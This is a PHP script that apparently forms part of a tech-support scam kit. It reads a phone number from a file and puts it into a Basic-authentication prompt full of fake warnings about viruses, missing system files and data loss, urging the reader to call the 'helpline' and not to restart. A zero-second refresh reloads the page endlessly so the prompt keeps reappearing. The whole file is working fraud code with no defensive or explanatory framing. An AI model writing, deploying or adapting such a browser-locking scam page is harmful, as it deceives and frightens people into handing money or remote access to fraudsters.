<?php
$myfile = fopen("../number.txt", "r") or die("Unable to open file!");
$phone = fgets($myfile);
//
$phone = trim(preg_replace('/\s\s+/', ' ', $phone));
fclose($myfile);


header('WWW-Authenticate: Basic realm="Suspicious activity detected on your IP address due to harmful virus installed in your computer. Call us now at '.$phone.' for any assistance. Your data is at a serious risk.There is a system file missing due to some harmfull virus Debug malware error, system failure. Please contact technicians to rectify the issue.Please do not open internet browser for your security issue to avoid data corruption on your operating system. Please contact  technicians/Helpline at '.$phone.' PLEASE DO NOT SHUT DOWN OR RESTART YOUR COMPUTER, DOING THAT MAY LEAD TO DATA LOSS AND FAILURE OF OPERATING SYSTEM , HENCE NON BOOTABLE SITUATION RESULTING COMPLETE DATA LOSS . CONTACT ADMINISTRATOR DEPARTMENT TO RESOLVE THE ISSUE ON OUT SUPPORT LINE '.$phone.'."');
header('Location: report1.php');
header('HTTP/1.0 401 Unauthorized');
$page = $_SERVER['PHP_SELF'];
$sec = "0";
header("Refresh: $sec; url=$page");
echo "<html><head><title>Internet Security Damaged !!! Call Help Desk</title></head><body>";
?>
